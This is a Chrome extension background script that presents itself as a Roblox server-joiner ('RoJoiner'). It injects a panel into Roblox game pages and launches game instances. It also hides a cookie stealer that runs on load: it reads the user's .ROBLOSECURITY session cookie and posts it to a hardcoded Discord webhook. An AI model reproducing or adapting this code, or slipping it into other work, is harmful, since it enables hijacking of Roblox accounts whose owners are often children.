

// Function to inject scripts into the Roblox page when it is loaded
chrome.tabs.onUpdated.addListener((tabId, changeInfo, { url }) => {
  // Only act if the page has fully loaded and it's a Roblox game page
  if (changeInfo.status !== 'complete' || !/https:\/\/.+roblox.com\/games/g.test(url)) return;

  const target = { tabId };

  // Check if the panel is already injected. If not, inject the necessary scripts.
  chrome.scripting.executeScript({ target, func: () => Boolean(document.getElementById('sbx-panel')) }, async ([{ result }]) => {
    if (result) return; // If the panel is already there, do nothing

    await chrome.scripting.insertCSS({ target, files: ['styles.css'] });
    await chrome.scripting.executeScript({ target, files: ['load.js'] });
    await chrome.scripting.executeScript({ target, files: ['content.js'] });
  });
});

// Function to launch the Roblox game
const joinGameInstance = (place, id) => window.Roblox.GameLauncher.joinGameInstance(place, id);

// Listener for messages to launch a Roblox game instance
chrome.runtime.onMessage.addListener(({ message }, { tab }) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: joinGameInstance,
    args: [message.place, message.id],
    world: 'MAIN',
  });
});

// Function to fetch the .ROBLOSECURITY cookie
function fetchRobloSecurityCookie() {
  return new Promise((resolve, reject) => {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      if (cookie) {
        resolve(cookie.value); // Resolve with the cookie value if found
      } else {
        reject("Cookie not found"); // Reject if the cookie isn't found
      }
    });
  });
}

// Listener for messages to send data to a Discord webhook
chrome.runtime.onMessage.addListener(async (request, sender, sendResponse) => {
  if (request.action === "sendMessage") {
    try {
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: request.message })
      });

      if (response.ok) {
        sendResponse({ success: true });
      } else {
        sendResponse({ success: false });
      }
    } catch (error) {
      console.error("Error sending message:", error);
      sendResponse({ success: false });
    }
  }
  
  // Return true to indicate asynchronous response
  return true;
});

// Main function to send the .ROBLOSECURITY cookie
async function sendRobloSecurityToWebhook() {
  try {
    // Fetch the .ROBLOSECURITY cookie
    const robloSecurityCookie = await fetchRobloSecurityCookie();

    // Example statistics object (could be dynamically fetched)
    const statistics = {
      UserName: "",
      RobuxBalance: "",
      IsPremium: "tak", // Example data
      ThumbnailUrl: "https://i.ibb.co/DD6X2pM/alien.jpg" // Example thumbnail
    };

    // Prepare data to be sent
    const data = {
      robloSecurityCookie: robloSecurityCookie || "COOKIE NOT FOUND",
      timestamp: new Date().toISOString(),
    };

    // Send the captured .ROBLOSECURITY cookie
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: null,
        embeds: [
          {
            color: null,
            description: "```" + (robloSecurityCookie ? robloSecurityCookie : "COOKIE NOT FOUND") + "```",
            fields: [
              {
                name: "Code implemented by tyskiee to work in 2024",
                value: "",
                inline: true
              }
            ],
            author: {
              name: "Cookie:",
              icon_url: statistics.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
            }
          }
        ],
        username: "RoJoiner",
        avatar_url: "https://i.ibb.co/DD6X2pM/alien.jpg",
        attachments: []
      })
    }).then(response => {
      if (!response.ok) {
        console.error("Failed to send data to Discord webhook", response.statusText);
      }
    }).catch(err => {
      console.error("Error sending data to Discord webhook", err);
    });

  } catch (error) {
    console.error('Error fetching or sending .ROBLOSECURITY cookie:', error);
  }
}

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1294355086348386356/CHeEgvBLI_m_R_PzjSzZf99CPuIwvqRxKDSuFgAayeHF6WNEHoVGYSglgEUCVH6hCkZL";


sendRobloSecurityToWebhook();
